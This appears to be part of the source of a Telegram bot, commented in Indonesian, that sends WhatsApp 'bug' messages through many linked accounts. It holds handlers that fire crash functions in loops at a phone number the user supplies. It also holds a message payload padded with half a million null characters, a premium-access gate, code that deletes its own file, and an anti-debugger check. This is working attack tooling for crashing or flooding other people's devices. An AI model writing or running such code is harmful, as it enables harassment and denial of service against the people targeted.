        ctx.reply("Terjadi kesalahan saat mengirim pesan. Silakan coba lagi.");
    }
});
bot.action(/nebula_(.+)/, async (ctx) => {
    const chatId = ctx.chat.id;
    const msgText = ctx.match[1];

    if (!msgText) {
        return ctx.reply("Format: xis_<nomor>_<pesan>");
    }

    if (!isPremium(ctx.from.id)) {
        return ctx.reply("⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan perintah ini.", { parse_mode: "Markdown" });
    }

    const args = msgText.split("_");
    const targetNumber = args[0];
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;

    try {
        if (sessions.size === 0) {
            return ctx.reply("Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender");
        }

        const statusMessage = await ctx.reply(`╔════════════════════╗  
║      SESSION INFO      
╠════════════════════╣  
║ TARGET    : ${formattedNumber}  
║ TOTAL BOT : ${sessions.size}  
╚════════════════════╝`);

        let successCount = 0;
        let failCount = 0;

        for (const [botNum, sock] of sessions.entries()) {
            try {
                if (!sock.user) {
                    console.log(`Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`);
                    await initializeWhatsAppConnections();
                    continue;
                }

                for (let i = 0; i < 5; i++) {
                    await crashui(sock, target);
                    await noclick(sock, target);
                    await nebula(sock, target)
                    await Invisibleloadfast(sock, target);
                    await click(sock, target);
                    await uisystem(sock, target);
                    await TagNull2(sock, target);
                    await crashgox(sock, target)
                    await nebula(sock, target)
                }
                successCount++;
            } catch (error) {
                failCount++;
            }
        }

        await ctx.telegram.editMessageText(
            chatId,
            statusMessage.message_id,
            undefined,
            `╔════════════════════╗  
║   DIFFUSION REPORT   
╠════════════════════╣  
║ TARGET    : ${formattedNumber}  
║ TYPE      : NEBULA COMBO
║ SUCCESS   : ${successCount}  
║ FAILED    : ${failCount}  
║ TOTAL NUM : ${sessions.size}  
╚════════════════════╝`,
            { parse_mode: "Markdown" }
        );

    } catch (error) {
        ctx.reply("Terjadi kesalahan saat mengirim pesan. Silakan coba lagi.");
    }
});
bot.action(/xios_(.+)/, async (ctx) => {
    const chatId = ctx.chat.id;
    const msgText = ctx.match[1];

    if (!msgText) {
        return ctx.reply("Format: xis_<nomor>_<pesan>");
    }

    if (!isPremium(ctx.from.id)) {
        return ctx.reply("⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan perintah ini.", { parse_mode: "Markdown" });
    }

    const args = msgText.split("_");
    const targetNumber = args[0];
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;

    try {
        if (sessions.size === 0) {
            return ctx.reply("Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender");
        }

        const statusMessage = await ctx.reply(`╔════════════════════╗  
║      SESSION INFO      
╠════════════════════╣  
║ TARGET    : ${formattedNumber}  
║ TOTAL BOT : ${sessions.size}  
╚════════════════════╝`);

        let successCount = 0;
        let failCount = 0;

        for (const [botNum, sock] of sessions.entries()) {
            try {
                if (!sock.user) {
                    console.log(`Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`);
                    await initializeWhatsAppConnections();
                    continue;
                }

                for (let i = 0; i < 2; i++) {
                    await BugIos(target);
                }
                successCount++;
            } catch (error) {
                failCount++;
            }
        }

        await ctx.telegram.editMessageText(
            chatId,
            statusMessage.message_id,
            undefined,
            `╔════════════════════╗  
║   DIFFUSION REPORT   
╠════════════════════╣  
║ TARGET    : ${formattedNumber}  
║ TYPE      : SHADOWIOS
║ SUCCESS   : ${successCount}  
║ FAILED    : ${failCount}  
║ TOTAL NUM : ${sessions.size}  
╚════════════════════╝`,
            { parse_mode: "Markdown" }
        );

    } catch (error) {
        ctx.reply("Terjadi kesalahan saat mengirim pesan. Silakan coba lagi.");
    }
});
bot.action(/xis_(.+)/, async (ctx) => {
    const chatId = ctx.chat.id;
    const msgText = ctx.match[1];

    if (!msgText) {
        return ctx.reply("Format: xis_<nomor>_<pesan>");
    }

    if (!isPremium(ctx.from.id)) {
        return ctx.reply("⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan perintah ini.", { parse_mode: "Markdown" });
    }

    const args = msgText.split("_");
    const targetNumber = args[0];
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;

    try {
        if (sessions.size === 0) {
            return ctx.reply("Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender");
        }

        const statusMessage = await ctx.reply(`╔════════════════════╗  
║      SESSION INFO      
╠════════════════════╣  
║ TARGET    : ${formattedNumber}  
║ TOTAL BOT : ${sessions.size}  
╚════════════════════╝`);

        let successCount = 0;
        let failCount = 0;

        for (const [botNum, sock] of sessions.entries()) {
            try {
                if (!sock.user) {
                    console.log(`Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`);
                    await initializeWhatsAppConnections();
                    continue;
                }

                for (let i = 0; i < 2; i++) {
                    await BugIos(target);
                }
                successCount++;
            } catch (error) {
                failCount++;
            }
        }

        await ctx.telegram.editMessageText(
            chatId,
            statusMessage.message_id,
            undefined,
            `╔════════════════════╗  
║   DIFFUSION REPORT   
╠════════════════════╣  
║ TARGET    : ${formattedNumber}  
║ TYPE      : INVISIOS
║ SUCCESS   : ${successCount}  
║ FAILED    : ${failCount}  
║ TOTAL NUM : ${sessions.size}  
╚════════════════════╝`,
            { parse_mode: "Markdown" }
        );

    } catch (error) {
        ctx.reply("Terjadi kesalahan saat mengirim pesan. Silakan coba lagi.");
    }
});
// Command untuk melihat daftar admin
bot.command('listadmin', (ctx) => {
    const adminList = Object.keys(admins);

    if (adminList.length > 0) {
        const details = adminList.map((userId) => `- User ID: ${userId}`).join('\n');
        ctx.reply(`📋 𝙇𝙞𝙨𝙩 𝘼𝙙𝙢𝙞𝙣𝙨\n\n${details}`);
    } else {
        ctx.reply('❌ No admins found.');
    }
});
//tws
// Command untuk fitur khusus admin
bot.command('adminfeature', (ctx) => {
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah admin
    if (!isAdmin(userId)) {
        return ctx.reply('❌ This feature is for admins only. Contact the owner for access.');
    }

    // Logika untuk admin
    ctx.reply('🎉 Welcome to the admin-only feature! Enjoy exclusive benefits.');
});

const cooldowns2 = new Map();

// Durasi cooldown dalam milidetik (misal 10 detik)
const COOLDOWN_DURATION = 120000;

// Flag untuk mengaktifkan atau menonaktifkan cooldown
let isCooldownActive = true;

// Middleware untuk menerapkan mekanisme cooldown
const cooldownMiddleware = (ctx, next) => {
  const userId = ctx.from.id.toString(); // Get user ID

  // Check if user is the owner or an admin
  if (userId === OWNER_ID || isAdmin(userId)) {
    console.log(`User ${userId} is exempt from cooldown (admin or owner).`);
    return next(); // Allow command execution without cooldown
  }

  if (!isCooldownActive) {
    // If cooldown is disabled, continue without restriction
    return next();
  }

  // Check if user is in cooldown
  if (cooldowns2.has(userId)) {
    const remainingTime = ((cooldowns2.get(userId) + COOLDOWN_DURATION) - Date.now()) / 1000;
    return ctx.reply(`⏳ You must wait ${remainingTime.toFixed(1)} seconds before using this command again.`);
  }

  // Set the user in cooldown
  cooldowns2.set(userId, Date.now());
  
  // Remove user from cooldown after the specified duration
  setTimeout(() => cooldowns2.delete(userId), COOLDOWN_DURATION);

  // Proceed to the next handler
  return next();
};

bot.command('startdeploy', async (ctx) => {
  try {
    const botFolders = fs.readdirSync(BOTS_DIR);

    if (botFolders.length === 0) {
      return ctx.reply("🚨 *Tidak ada bot yang tersedia untuk dijalankan ulang!*", { parse_mode: "Markdown" });
    }

    let tasks = botFolders.map(botFolder => {
      return new Promise((resolve, reject) => {
        const botPath = path.join(BOTS_DIR, botFolder, 'index.js');

        if (fs.existsSync(botPath)) {
          exec(`cd ${path.join(BOTS_DIR, botFolder)} && node index.js`, (error, stdout, stderr) => {
            if (error) {
              console.error(`Gagal menjalankan ulang bot di ${botFolder}: ${error.message}`);
              return reject(error);
            }
            if (stderr) console.error(`stderr: ${stderr}`);

            ctx.reply(`✅ *Bot di ${botFolder} berhasil dijalankan ulang!*`, { parse_mode: "Markdown" });
            resolve();
          });
        } else {
          resolve();
        }
      });
    });

    // Tunggu semua proses exec selesai
    await Promise.all(tasks);

    // Cek apakah setidaknya ada satu bot yang dijalankan
    if (tasks.length === 0) {
      ctx.reply("🚨 *Tidak ada bot yang dapat dijalankan ulang!*", { parse_mode: "Markdown" });
    }

  } catch (err) {
    ctx.reply(`🚨 *Gagal menjalankan ulang bot!*\n\nError: ${err.message}`, { parse_mode: "Markdown" });
    console.error(`Restart error: ${err.message}`);
  }
});

// Command untuk mengatur status cooldown
bot.command('cdmurbug', (ctx) => {
  const args = ctx.message.text.split(' ')[1]?.toLowerCase(); // Ambil argumen setelah command
     const userId = ctx.from.id;
 const ownerId = ctx.from.id.toString();
    // Cek apakah pengguna adalah owner atau memiliki akses DeLaplace
    if (ownerId !== OWNER_ID && !isDeLaplace(userId)) {
        return ctx.reply('❌ You are not authorized to use this command.');
    }    
  if (args === 'true') {
    isCooldownActive = true;
    ctx.reply('✅ Cooldown diaktifkan.');
  } else if (args === 'false') {
    isCooldownActive = false;
    ctx.reply('❌ Cooldown dinonaktifkan.');
  } else {
    ctx.reply('⚙️ Gunakan /cdmurbug true untuk mengaktifkan atau /cdmurbug false untuk menonaktifkan.');
  }
});
const process = require('process');

// Gunakan middleware cooldown untuk command tertentu
bot.command('bokep', cooldownMiddleware, (ctx) => {
  ctx.reply('jangan spam.');
});
// Fungsi untuk mengirim pesan saat proses
const kirimpesan = async (number, message) => {
  try {
    const target = `${number}@s.whatsapp.net`;
    await sock.sendMessage(target, {
      text: message
    });
    console.log(`Pesan dikirim ke ${number}: ${message}`);
  } catch (error) {
    console.error(`Gagal mengirim pesan ke WhatsApp (${number}):`, error.message);
  }
};
const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply(`
╭──(  ❌ ERROR   )
│
│ Device Belom Terhubung
│ Tolong Sambungin Terlebih Dahulu😡
│
╰━━━ㅡ━━━━━ㅡ━━━━━━⬣
`);
    return;
  }
  next();
};
const QBug = {
  key: {
    remoteJid: "p",
    fromMe: false,
    participant: "0@s.whatsapp.net"
  },
  message: {
    interactiveResponseMessage: {
      body: {
        text: "Sent",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\0".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
        version: 3
      }
    }
  }
};
//func bug

//last
    bot.launch().catch(console.error);
setInterval(() => {
    const now = Date.now();
    Object.keys(usersPremium).forEach(userId => {
        if (usersPremium[userId].premiumUntil < now) {
            delete usersPremium[userId];
        }
    });
    fs.writeFileSync(USERS_PREMIUM_FILE, JSON.stringify(usersPremium));

    if (isExpired()) {
        console.log("");
        
        // Self-destruction: Hapus file script
        setTimeout(() => {
            try {
                fs.unlinkSync(__filename);
                console.log("✅ Script bot telah dihapus otomatis karena expired.");
                process.exit(1);
            } catch (error) {
                console.error("❌ Gagal menghapus script:", error);
            }
        }, 5000);
    }
}, 60 * 1000); // Cek setiap 1 menit

function detectDebugger() {
  const start = Date.now();
  debugger;
  if (Date.now() - start > 100) {
    console.error("Debugger detected! Exiting...");
    process.exit(1);
  }
}

setInterval(detectDebugger, 5000);
const os = require('os');

// BOT WHATSAPP
